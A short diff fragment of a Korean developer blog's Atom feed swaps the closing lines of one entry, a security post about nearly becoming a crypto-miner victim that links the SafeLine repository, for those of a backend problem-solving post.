-<a href="https://github.com/chaitin/SafeLine">SafeLine Github Repository</a></p>]]></content><author><name>Paul2021-R</name></author><category term="학습" /><category term="Frontend" /><category term="NextJS" /><category term="React" /><category term="Security" /><summary type="html"><![CDATA[내 컴퓨터가 채굴기가 될 뻔했….지만 해결기]]></summary></entry></feed>
+<p>노력해야겠다.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><summary type="html"><![CDATA[들어가면서]]></summary></entry></feed>
